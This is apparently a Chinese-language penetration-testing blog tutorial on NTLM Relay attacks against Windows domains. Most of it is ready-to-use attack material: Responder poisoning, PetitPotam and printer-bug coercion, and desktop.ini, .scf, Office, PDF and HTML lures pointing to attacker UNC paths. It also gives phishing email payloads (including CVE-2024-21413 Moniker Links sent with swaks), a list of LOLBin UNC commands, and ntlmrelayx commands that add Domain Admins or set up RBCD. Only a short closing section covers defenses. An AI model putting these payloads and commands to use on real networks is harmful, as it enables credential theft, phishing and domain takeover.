---
title: 攻击方式 - NTLM Relay（手法很多）
date: 2026-08-30 19:30:00
categories:
  - 渗透测试
tags:
  - NTLM Relay
  - 内网渗透
  - 域渗透
description: 攻击方式 - NTLM Relay（手法很多）
---

## NTLM Relay:
#### 定义：
NTLM Relay 攻击是指攻击者**捕获用户的 NTLM 认证流量**，然后将其**中继（转发）到另一台服务器**，从而冒充该用户身份访问目标服务的攻击方式。

> 与 Pass-the-Hash 的区别：PtH 用的是 NTLM Hash 直接认证，NTLM Relay 用的是实时捕获的 Net-NTLM Hash 中继认证。
>

#### NTLM认证流程：
<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/ntlm-relay-001.jpeg)

1. 客户端 → 服务器：发送用户名，请求认证（NEGOTIATE）
2. 服务器 → 客户端：返回随机数 Challenge
3. 客户端：用自己的 NTLM Hash 加密 Challenge，生成 Response
4. 客户端 → 服务器：发送 Response（AUTHENTICATE）
5. 服务器 → 域控：把 Response、Challenge、用户名发给域控验证
6. 域控：用相应用户的 Hash 加密 Challenge，与 Response 比较，匹配则认证成功

####  攻击原理:
 攻击者处于**中间人位置**，把客户端的认证流量转发给目标服务器：  

```plain
客户端 → 攻击者（捕获 Challenge）
攻击者 → 目标服务器（转发 NEGOTIATE）
目标服务器 → 攻击者（返回 Challenge）
攻击者 → 客户端（转发 Challenge）
客户端 → 攻击者（返回 Response）
攻击者 → 目标服务器（转发 Response）
目标服务器 → 认证成功，攻击者获得访问权限
```

**核心**：攻击者不需要知道用户的密码，只需要把认证流程 "中转" 一下，就能冒充用户访问目标服务器。  

## 攻击条件:
1. **目标服务器****未启用 SMB 签名**（或签名策略为 "支持但不强制"）
2. **攻击者能捕获受害者的 ****Net-NTLM**** 认证流量**
3. **当前账户****有****管理员权限****访问****目标服务器**

## 实战场景:
**场景 1：抓到 ****Hash 但爆破失败****，中继横向移动**

+ 情况：用 Responder 抓到了管理员的 Net-NTLM Hash，但密码太复杂，hashcat 跑了几天都爆破不出来
+ 利用：把这个 Net-NTLM Hash 直接中继到内网里没开 SMB 签名的目标服务器
+ 结果：不需要知道密码，直接以管理员身份访问目标服务器，dump 哈希或执行命令

**场景 2：****低权限主机横向****移动到****内网服务器**

+ 情况：刚拿到一台普通域内机器的低权限 shell，没有捞到任何凭据，目标是内网的文件服务器（ 目标可以是**任何没开 SMB 签名、且受害者有权限访问的服务**）
+ 利用：在控制的机器上跑 Responder 投毒，同时跑 ntlmrelayx 把捕获到的认证中继到文件服务器
+ 结果：等内网里某个有权限的用户触发LLMNR广播，认证被中继过去，直接拿到文件服务器访问权限

**场景 3：****诱导域控****主动****认证****，中继拿域**

+ 情况：控制了一台域内成员机器，目标是拿下域控
+ 利用：用 SpoolSample 打印机漏洞或 PetitPotam 诱导域控主动向你发起认证，然后把域控的认证中继到其他没开签名的服务器或域控的 LDAP 服务
+ 结果：以域控身份在 AD 里添加用户、修改 ACL，进而拿到域管权限，拿下整个域

## 攻击过程:
攻击分为两步：

1. 捕获Net-NTLM Hash
2. 重放Net-NTLM Hash

### 🚩捕获Net-NTLM Hash
#### 1️⃣监听：捕获目标服务器发来的NTLM请求
##### 工具：Responfer
```plain
抓 Hash 用:
python3 Responder.py -I ip -wrfv

配合 NTLM relayx 中继用（关闭自身的 SMB/HTTP 服务，让中继工具处理）
python3 Responder.py -I ip -rPv

Kali自带，直接运行
responder -I ip -wrf
```

**Responder = 投毒骗人 + 抓 Hash**

**ntlmrelayx = 监听接收 + 中继转发**

#### 2️⃣**诱导域控主动认证****:使目标服务器主动向攻击者发起NTLM认证**
##### LLMNR&NBNS协议攻击
###### LLMNR和NBNS协议：
是局域网内的协议，主要用于局域网中的名称解析。当其他地方解析失败时，windows系统就会使用LLMNR和NBNS协议解析名称。

> windows系统的名称解析的顺序：
>
> 1. 本地host文件（%windir%\System32\dirvers\etc\hosts）
> 2. DNS缓存/DNS服务器
> 3. LLMNR和NBNS协议
>

**LLMNR（链路本地多播名称解析）**：Windows 系统在 DNS 解析失败时，通过多播向同一网段的所有主机询问 "谁是这个名字" 的协议。  

**NBNS（NetBIOS 名称服务）**：更老的 Windows 名称解析协议，通过广播向同一网段询问主机名，是 LLMNR 的前身。  

| 对比项 | LLMNR | NBNS |
| --- | --- | --- |
| **端口** | UDP 5355 | UDP 137 |
| **传输方式** | 多播（Multicast） | 广播（Broadcast） |
| **出现时间** | Vista 之后引入，较新 | 老协议，从 Windows NT 时代就有 |
| **解析范围** | IPv4 + IPv6 | 仅 IPv4 |
| **默认开启** | Windows 默认开启 | Windows 默认开启 |


######  LLMNR&NBNS 攻击原理  
 利用 Windows 名称解析的 "信任机制"，冒充目标主机应答，诱导受害者主动送上门认证  

```plain
1. 受害者访问一个不存在的主机名（比如输错共享名 \\filesvr）
    ↓
2. DNS 解析失败
    ↓
3. 受害者发起 LLMNR 多播 / NBNS 广播，问"谁是 filesvr？"
    ↓
4. 攻击者抢先应答："我是 filesvr，来连我吧"
    ↓
5. 受害者信以为真，主动向攻击者发起 NTLM 认证
    ↓
6. 攻击者捕获到受害者的 Net-NTLM Hash
```

###### 工具：ntlmrelayx.py
```plain
# 1. 确认当前机子网卡
ip addr  # 假设是 eth0，IP是192.168.1.50

# 2. 启动中继
python3 ntlmrelayx.py -smb2support -t smb://192.168.1.200

# 3. 启动 Responder
python3 Responder.py -I eth0 -rPv

# 4. 抓到后查看结果
cat logs/SMB-NTLMv2-SSP-*.txt
```

##### 打印机漏洞
###### 打印机漏洞原理
 Windows Print Spooler（打印后台处理服务）默认开启，存在一个功能：**任何域用户都可以通过 MS-RPRN 协议，强制一台主机向指定的另一台主机发起认证请求。**

###### 工具：printerbug.py
```plain
启动 ntlmrelayx

printerbug 诱导域控主动认证：
python3 printerbug.py 域名/用户名:密码@目标主机IP 攻击者IP
```

##### 🚩PetitPotam攻击
###### PetitPotam攻击原理：
 PetitPotam 利用 **MS-EFSRPC****（加密文件系统远程协议）** 中的一个功能，强制目标主机向指定的攻击者主机发起 NTLM 认证。  

###### 工具：Pertitpotam.py
```plain
启动 ntlmrelayx

基础命令：
python3 PetitPotam.py 攻击者IP 目标主机IP
带认证：
python3 PetitPotam.py -u 用户名 -p 密码 -d 域名 攻击者IP 目标主机IP
用 Hash 登录：
python3 PetitPotam.py -u 用户名 -hashes :NTLM哈希 -d 域名 攻击者IP 目标主机IP
```

##### 图标
当 Windows 资源管理器加载文件 / 文件夹图标时，如果图标路径是一个 **UNC 路径**（`\\攻击者IP\共享名`），Windows 会主动向这个 UNC 路径发起 NTLM 认证，攻击者就能捕获到 Net-NTLM Hash。  

 本质：利用 Windows 自动加载图标的特性，诱导目标机器主动送上门认证。  

###### 🚩desktop.ini文件
**原理**

每个文件夹可以有一个 `desktop.ini` 文件，用来自定义文件夹图标。把图标路径改成攻击者的 UNC 路径，用户一打开这个文件夹，就会触发 NTLM 认证。

操作步骤

第 1 步：创建 desktop.ini 文件

```plain
[.ShellClassInfo]
IconFile=\\攻击者IP\share\icon.ico
IconIndex=0
```

第 2 步：设置文件夹属性

```plain
# 给文件夹设置系统属性，desktop.ini 才会生效
attrib +s "目标文件夹路径"
```

第 3 步：把 desktop.ini 放进目标文件夹

把写好的 `desktop.ini` 放到共享文件夹里，等用户打开。

第 4 步：启动 Responder 监听

```plain
python3 Responder.py -I eth0 -wrf
```

第 5 步：等用户打开文件夹

用户一打开这个文件夹，Windows 就会去 `\\攻击者IP\share\icon.ico` 加载图标，主动发起 NTLM 认证。

###### .scf后缀文件
（⚠️ 新版 Windows 部分失效）

`.scf` 是 Windows 资源管理器的命令文件，打开时会自动加载 `IconFile` 指定的图标。

**文件内容**：

```plain
[Shell]
Command=2
IconFile=\\攻击者IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

保存为 `任意文件名.scf`，放进共享文件夹。

> ⚠️ 注意：Windows 10 1809 之后的版本，.scf 文件攻击已被缓解，需要用户双击才会触发，成功率降低。推荐优先用 desktop.ini。
>

##### 浏览器
 当浏览器访问的页面中含有 **UNC 路径**（`\\攻击者IP\共享名`）时，浏览器在解析该页面时会尝试请求该 UNC 地址，然后自动发起 NTLM 认证，攻击者就能捕获到 Net-NTLM Hash。  

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/ntlm-relay-002.jpeg)

###### **触发方式：**
在 HTML 页面中插入各种指向 UNC 路径的标签：

```plain
<img src="\\攻击者IP\share\pic.jpg">
<link rel="stylesheet" href="\\攻击者IP\share\style.css">
<script src="\\攻击者IP\share\test.js"></script>
<iframe src="\\攻击者IP\share\page.html"></iframe>
<div style="background: url(\\攻击者IP\share\bg.png)"></div>
```

用户访问这个页面时，浏览器会自动去加载这些资源，从而发起 NTLM 认证。

**现代浏览器基本失效：**

 现代浏览器出于安全考虑，默认禁止从 HTTP/HTTPS 页面加载 `file://` 和 UNC 路径资源，会直接拦截，不会发起 NTLM 认证。  

**现在还能用的场景：**

虽然浏览器直接加载 UNC 路径被禁了，但还有一些场景可以利用：

###### 场景 1：内网 Web 应用触发
如果目标是内网的 Web 应用，且应用存在以下问题，仍然可以触发：

+ SSRF 漏洞：让服务器端去请求 UNC 路径
+ 文件上传 / 包含：上传包含 UNC 路径的文件
+ HTML 注入 / 存储型 XSS：在内网网站插入 UNC 路径图片

```plain
<!-- 存储型 XSS  payload，插入内网论坛/博客 -->
<img src="\\10.0.0.50\share\x.jpg" style="display:none">
```

其他用户浏览这个页面时，如果浏览器策略允许（比如企业内网环境放宽了限制），就会触发认证。

###### 场景 2：钓鱼 + 本地 HTML 文件
发钓鱼邮件，附件是一个 `.html` 文件，用户下载后本地双击打开：

```plain
<!DOCTYPE html>
<html>
<body>
  <h1>正在加载，请稍候...</h1>
  <img src="\\10.0.0.50\share\loading.jpg" style="display:none">
</body>
</html>
```

本地打开的 HTML 文件（`file://` 协议）访问 UNC 路径，部分浏览器不会拦截，成功率比远程页面高。

###### 场景 3：利用 .url/.website 快捷方式
创建一个 `.url` 文件，放在共享文件夹里：

```plain
[InternetShortcut]
URL=\\攻击者IP\share\test
IconFile=\\攻击者IP\share\icon.ico
IconIndex=0
```

用户浏览到这个文件时，资源管理器会尝试加载图标，触发 NTLM 认证（这个本质上是图标攻击，不是浏览器攻击，但效果类似）。

###### 配合 Responder 完整流程
```plain
# 1. 启动 Responder 监听
python3 Responder.py -I eth0 -wrf

# 2. 准备恶意页面（任选一种触发方式）
# 方式A：远程页面（成功率低）
# 方式B：本地 HTML 钓鱼文件（成功率较高）

# 3. 诱导用户访问/打开
# 4. Responder 捕获 Net-NTLM Hash
```

##### Outlook
利用 Outlook 渲染邮件内容时的特性，在邮件中插入指向攻击者 UNC 路径的资源（图片、链接等），当受害者打开或预览邮件时，Outlook 会自动向攻击者的 SMB 服务器发起 NTLM 认证，从而泄露 Net-NTLM Hash。

###### 方式 1：邮件中插入 UNC 路径图片
原理:HTML 格式的邮件中插入 `<img>` 标签，src 指向 UNC 路径，Outlook 渲染邮件时自动加载图片，触发 NTLM 认证。

邮件内容

```plain
<html>
<body>
  <p>您好，请查收附件。</p>
  <img src="\\攻击者IP\share\logo.jpg" width="1" height="1" style="display:none">
</body>
</html>
```

需要用户手动点击 "下载图片" 才会触发，成功率低

###### 方式 2：Moniker Link 攻击（CVE-2024-21413）⭐ 重点
原理:Outlook 解析 `file://` 协议链接时存在漏洞，当链接格式为 `file://\\攻击者IP\共享名\文件` 时，Outlook 会绕过安全检查，直接向攻击者的 SMB 服务器发起 NTLM 认证。

利用条件:

+ Outlook 版本未打 2024 年 2 月补丁
+ 受害者点击邮件中的链接（或某些版本预览就触发）

邮件内容

```plain
<html>
<body>
  <p>请点击查看文档：</p>
  <a href="file://\\10.0.0.50\share\document.docx">点击查看</a>
</body>
</html>
```

关键：链接必须用 `file://\\IP\共享\文件` 格式，不能用普通的 `\\IP\共享\文件`。

###### 方式 3：日历共享功能漏洞（较新）
原理:利用 Outlook 日历共享功能，构造特殊的邮件头（`Content-Class` 和 `x-sharing-config-url`），当受害者打开邮件时，Outlook 会自动向 `x-sharing-config-url` 指定的 UNC 路径发起认证。

邮件头:

```plain
Content-Class: sharing
x-sharing-config-url: \\攻击者IP\share\config
```

###### 完整利用流程
```plain
# 第1步：启动 Responder 监听
python3 Responder.py -I eth0 -wrf

# 第2步：构造恶意邮件（任选一种方式）
# - HTML 邮件插入 UNC 图片
# - Moniker Link 攻击（file://\\IP\share）
# - 日历共享邮件头

# 第3步：发送邮件给受害者
# 可以用 sendmail、swaks、或直接用 Outlook 发送

# 第4步：受害者打开/预览/点击邮件
# Outlook 自动向攻击者发起 NTLM 认证

# 第5步：Responder 捕获 Net-NTLM Hash
# 可以爆破，或者配合 ntlmrelayx 中继
```

###### 用 swaks 发送恶意邮件（命令行）
```plain
# 安装 swaks
apt install swaks

# 发送 HTML 格式的恶意邮件
swaks --to 受害者@域名.com \
  --from 攻击者@域名.com \
  --header "Subject: 请查收文档" \
  --body '<html><body><p>请点击查看：</p><a href="file://\\10.0.0.50\share\doc.docx">点击这里</a></body></html>' \
  --header "Content-Type: text/html" \
  --server 邮件服务器IP
```

##### 🚩系统命令
通过执行系统命令访问指定的UNC路径，也可以获取目标机器的Net-NTLM Hash

###### 常用命令列表：
```bash
net.exe use \\host\share
attrib.exe \\host\share
cacls.exe \\host\share
certreq.exe \\host\share
certutil.exe \\host\share
cipher.exe \\host\share
ClipUp.exe -l \\host\share
cmd132.exe \\host\share
cmstp.exe /s \\host\share
colorcpl.exe \\host\share
comp.exe /N=0 \\host\share \\host\share
compact.exe \\host\share
control.exe \\host\share
convertvhd.exe -source \\host\share -destination \\host\share
Defrag.exe \\host\share
diskperf.exe \\host\share
dispdiag.exe -out \\host\share
doskey.exe /MACROFILE=\\host\share
esentutl.exe /k \\host\share
expand.exe \\host\share
extrac32.exe \\host\share
FileHistory.exe \\host\share
findstr.exe * \\host\share
fontview.exe \\host\share
fvenotify.exe \\host\share
FXSCOVER.exe \\host\share
hwrcomp.exe -check \\host\share
hwrreg.exe \\host\share
icacls.exe \\host\share
licensingdiag.exe -cab \\host\share
lodctr.exe \\host\share
lpksetup.exe /p \\host\share /s
makecab.exe \\host\share
msiexec.exe /update \\host\share /quiet
msinfo32.exe \\host\share
mspaint.exe \\host\share
msra.exe /openfile \\host\share
mstsc.exe \\host\share
netcfg.exe -l \\host\share -c p -i foo
```

>  **推荐的命令**：`certutil.exe`、`cipher.exe`、`icacls.exe`、`net.exe use`，这些比较常用且噪音小。  
>

##### Office
###### 原理：
新建 Word 文档，插入一张图片，然后修改文档内部的 XML 关系文件，把图片路径改成 UNC 路径。用户打开文档时，Word 会去加载远程图片，触发 NTLM 认证。

###### 操作步骤
1. 新建一个 Word 文档，插入一张图片
2. 用压缩软件打开 `.docx` 文件（docx 本质是 zip 包）
3. 进入 `word\_rels` 目录，打开 `document.xml.rels`
4. 找到图片对应的 `Target` 参数，原来是本地路径
5. 修改为指定的 UNC 路径，并加上 `TargetMode="External"`

修改示例

```xml
<!-- 原来 -->
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.png"/>

<!-- 修改后 -->
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="\\10.211.55.2\test\image1.png" TargetMode="External"/>
```

> ⚠️ **现状**：新版 Office 默认会提示"是否允许链接到外部图片"，需要用户确认。但很多用户会直接点允许。
>

##### PDF
###### 原理
PDF 文件可以添加请求远程 SMB 服务器文件的功能。用户用 PDF 阅读器打开恶意 PDF 时，PDF 会向远程 SMB 服务器发起请求，触发 NTLM 认证。

###### 工具：WorsePDF.py
```bash
python2 WorsePDF.py test.pdf 10.211.55.2
```

生成 `test.pdf.malicious.pdf` 文件。

> ⚠️ **重要注意**：经测试发现，**只有使用 ****Adobe PDF 阅读器**才能收到目标主机的 Net-NTLM Hash，Chrome、Edge 和 WPS 的 PDF 阅读器不能收到。
>

##### 🚩WPAD
###### 原理
WPAD（Web Proxy Auto-Discovery Protocol，Web 代理自动发现协议）用来查找 PAC（Proxy Auto-Config）文件。浏览器默认勾选"自动检测设置"，会自动查询 WPAD 主机的 PAC 文件。

###### 方式一：配合 LLMNR/NBNS 投毒
命令（参数）

```bash
responder -I eth0 -rPvw
```

流程

1. 用户访问网页，浏览器自动查询 `WPAD/wpad.dat`
2. DNS 解析失败，发起 NBNS/LLMNR 广播
3. Responder 抢答应答，告诉客户端 WPAD 的 IP 是攻击者
4. 客户端请求 `wpad.dat`，Responder 返回伪造的 PAC 文件，代理指向攻击者
5. 客户端通过攻击者代理访问网页，攻击者可以劫持 HTTP 流量，插入任意标签获取 Net-NTLM Hash 或 cookie

> ⚠️ **现状**：微软 2016 年发布了 **MS16-077** 补丁，修复了两个问题：
>
> 1. 系统无法再通过广播协议解析 WPAD，只能通过 DHCP 或 DNS
> 2. 请求 PAC 文件时不会自动发送凭据响应 NTLM 质询
>
> 打了补丁的机器无法通过 LLMNR/NBNS 欺骗进行 WPAD 攻击。
>

###### 方式二：配合 DNS IPv6（mitm6）
如果目标安装了 MS16-077 补丁，无法通过 LLMNR/NBNS 欺骗指定 WPAD，但可以通过 IPv6 DNS 欺骗。

原理

Windows Vista 之后默认启用 IPv6，且优先级高于 IPv4。攻击者通过 mitm6 应答 DHCPv6 请求，把目标的 IPv6 DNS 服务器设为攻击者，由于 IPv6 DNS 优先级高于 IPv4，就可以劫持 WPAD 解析。

命令（mitm6 kali以下载）

```bash
# 终端1：启动 mitm6
sudo mitm6 -i eth0 -d 域名

# 终端2：启动 responder
responder -I eth0 -rPvw
```

流程

1. 目标机器重启或重新配置网络时，发起 DHCPv6 请求
2. mitm6 应答，把目标的 IPv6 DNS 服务器设为攻击者
3. 目标查询 WPAD 时，走 IPv6 DNS，被攻击者劫持
4. 后续流程同上，获取 Net-NTLM Hash

---

### 🚩重放Net-NTLM Hash
#### 一、中继到 SMB 协议
直接中继到 SMB 服务，是最简单直接的方法，可以控制服务器执行任意命令。

##### （1）工作组环境
工作组中机器之间没有信任关系，除非两台机器账户密码相同，否则中继不成功。但可以**中继到机器自身**。

###### 1）MS08-068 Relay To Self
收到用户的 SMB 请求后，直接把请求中继回本身（Reflect），从而控制机器。

**漏洞编号**：MS08-068

**微软修复**：KB957097 补丁，通过修改 SMB 身份验证答复的验证方式防止凭据重播：

+ Type 1 阶段：主机 A 访问主机 B 时，`pszTargetName` 设为 `CIFS/B`
+ Type 2 阶段：主机 A 收到 Challenge 后，在 lsass 进程缓存 `(Challenge, CIFS/B)`
+ Type 3 阶段：主机 B 收到认证消息后，查询 lsass 缓存，如果存在缓存则认证失败

> 简单说：微软通过缓存机制防止了"中继到自身"。
>

###### 2）CVE-2019-1384 Ghost Potato ⭐
绕过了 KB957097 补丁中限制不能中继回本机的机制。

**原理**：缓存有时效性（300秒），POC 休眠 315 秒后再发送 Type 3 认证消息，缓存已被清除，从而绕过限制。

**命令**：

```bash
python ntlmrelayx.py -t smb://10.211.55.7 -smb2support --gpotato-startup test.txt
```

**效果**：在目标机器启动目录上传指定文件（test.txt），用户下次登录时执行。

> ⚠️ 注意：Ghost Potato 基于 Impacket 修改，目前只支持收到 HTTP 协议请求的情况。
>

##### （2）域环境
域环境中，普通域用户默认可以登录除域控外的其他所有机器，因此可以将域用户的 Net-NTLM Hash 中继到域内其他机器。

###### 1）impacket - smbrelayx.py
```bash
python3 smbrelayx.py -h 10.211.55.16 -c whoami
```

+ `-h`：目标主机 IP
+ `-c`：中继成功后执行的命令

###### 2）impacket - ntlmrelayx.py ⭐ 最常用
```bash
python3 ntlmrelayx.py -t smb://10.211.55.16 -c whoami -smb2support
```

+ `-t`：中继目标（格式 `smb://IP`）
+ `-c`：执行命令
+ `-smb2support`：支持 SMB2（必须加，否则很多机器连不上）

###### 3）Responder - MultiRelay.py
```bash
python3 MultiRelay.py -t 10.211.55.16 -u ALL
```

+ `-t`：中继目标
+ `-u ALL`：中继所有用户

**功能**：

+ 获得稳定的交互式 shell
+ 抓取内存密码（mimikatz）
+ 执行系统命令

> 注意：使用MultiRelay时，需要在Responder.conf中关闭 SMB 和 HTTP 服务器，避免端口冲突。
>

---

#### 二、中继到 HTTP
很多 HTTP 服务也支持 NTLM 认证，HTTP 默认策略是**不签名**的，因此可以直接中继。

##### 1）Exchange 认证（EWS 接口）
Exchange 支持 NTLM SSP，可以将 SMB 流量中继到 Exchange 的 EWS 接口，进行收发邮件等操作。

###### **工具**：ntlmRelayToEWS.py
```bash
python2 ntlmRelayToEWS.py -t https://10.211.55.5/EWS/exchange.asmx -r getFolder -f inbox -v
```

+ `-t`：EWS 接口地址
+ `-r getFolder`：获取文件夹
+ `-f inbox`：收件箱
+ `-v`：详细输出

**效果**：中继成功后自动导出邮件，保存在 `output/inbox` 目录。

##### 2）ADCS 注册接口
ADCS（证书服务）的 HTTP 接口默认使用 NTLM 认证，可以将流量中继到 ADCS 的证书注册接口，申请证书。

---

#### 三、中继到 LDAP 协议 ⭐ 重点
域内默认使用 LDAP，LDAP 也支持 NTLM 认证，这是域内 NTLM Relay 最常用的攻击方式。

**LDAP 签名策略**：默认是"协商签名"，不是强制签名，是否签名由客户端决定，服务端与客户端协商。

 基础命令 :

```bash
python3 ntlmrelayx.py -t ldap://域控IP -smb2support
```

##### 中继到 LDAP 能做什么
+ 添加域用户

```bash
python3 ntlmrelayx.py -t ldap://域控IP --add-user --add-to-group "Domain Admins" -smb2support
```

+  仅添加用户（不加组）  

```bash
python3 ntlmrelayx.py -t ldap://域控IP --add-user -smb2support
```

+  添加到指定组  

```bash
python3 ntlmrelayx.py -t ldap://域控IP --add-to-group "Enterprise Admins" -smb2support
```

+  Dump LDAP 信息  ( 导出域内所有用户、组、计算机的信息)

```bash
python3 ntlmrelayx.py -t ldap://域控IP --dump-ad -smb2support
```

+  修改用户密码  

```bash
python3 ntlmrelayx.py -t ldap://域控IP --escalate-user 用户名 -smb2support
```

+  配置 RBCD（基于资源的约束委派）⭐  

```bash
# 第1步：中继到 LDAP，创建机器账户并配置 RBCD
python3 ntlmrelayx.py -t ldap://域控IP --add-computer --delegate-access -smb2support

# 第2步：用创建的机器账户进行 RBCD 攻击
python3 getST.py -spn cifs/目标机器.域名 -impersonate administrator -hashes :机器账户NTLM哈希 域名/机器账户$ -dc-ip 域控IP

# 第3步：拿到 ST 后，用 Ptt 访问目标
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass 目标机器.域名
```

##### HTTP → LDAP vs SMB → LDAP
| 中继来源 | 是否需要签名 | 说明 |
| --- | --- | --- |
| **HTTP → LDAP** | ❌ 不要求签名 | 可以直接中继，如 CVE-2018-8581 |
| **SMB → LDAP** | ✅ 要求签名 | 不能直接中继，但 CVE-2019-1040 绕过了 NTLM 消息完整性校验 |


域内最新的中继手法：想办法将 HTTP 类型的流量中继到 LDAP

###### 🚩**HTTP → LDAP 中继（CVE-2018-8581）**
如果有 HTTP 类型的认证流量（比如 Exchange），可以直接中继到 LDAP，不需要签名：

```plain
# 中继 HTTP 到 LDAP
python3 ntlmrelayx.py -t ldap://域控IP --add-user --add-to-group "Domain Admins"
```

HTTP流量默认不签名，所以中继到LDAP成功率更高。

###### **SMB → LDAP 中继（CVE-2019-1040）**
SMB 流量默认要求签名，不能直接中继到LDAP。但CVE-2019-1040可以绕过 NTLM 消息完整性校验：

```plain
# 利用 CVE-2019-1040 中继 SMB 到 LDAP
python3 ntlmrelayx.py -t ldap://域控IP --remove-mic -smb2support
```

`--remove-mic` 参数：移除 NTLM 消息中的 MIC（消息完整性码），绕过签名校验。

---

### NTLM Relay 攻击防御
#### 核心防御：LDAP 签名
域内 NTLM Relay 最常见的是中继到 LDAP 执行高危险操作，因此需要对 LDAP 进行安全加固。

**微软计划**：2019 年 9 月发布通告，2020 年 1 月发布安全更新，**强制开启所有域控上的 LDAP 通道绑定与 LDAP 签名功能**。

如果域控上的 LDAP 强制开启了签名，攻击者将无法将其他流量中继到 LDAP 进行高危险操作。

#### 其他防御方法
1. **启用 SMB 签名**：所有服务器强制启用 SMB 签名
2. **禁用 LLMNR 和 NBT-NS**：减少被投毒的机会
3. **启用 EPA（扩展保护）**：对 HTTP 服务启用扩展保护
4. **限制账户权限**：普通用户不要有过高权限
5. **及时打补丁**：MS08-068、KB957097、CVE-2019-1384、CVE-2019-1040 等

---

### 常用中继工具命令汇总
```bash
# 1. ntlmrelayx（最常用，impacket）
python3 ntlmrelayx.py -t smb://目标IP -c whoami -smb2support
python3 ntlmrelayx.py -t ldap://域控IP -smb2support
python3 ntlmrelayx.py -tf targets.txt -smb2support  # 批量中继

# 2. smbrelayx（impacket）
python3 smbrelayx.py -h 目标IP -c whoami

# 3. MultiRelay（Responder 自带）
python3 MultiRelay.py -t 目标IP -u ALL

# 4. ntlmRelayToEWS（中继到 Exchange）
python2 ntlmRelayToEWS.py -t https://ExchangeIP/EWS/exchange.asmx -r getFolder -f inbox -v

# 5. Ghost Potato（中继到自身）
python ntlmrelayx.py -t smb://目标IP -smb2support --gpotato-startup test.txt
```

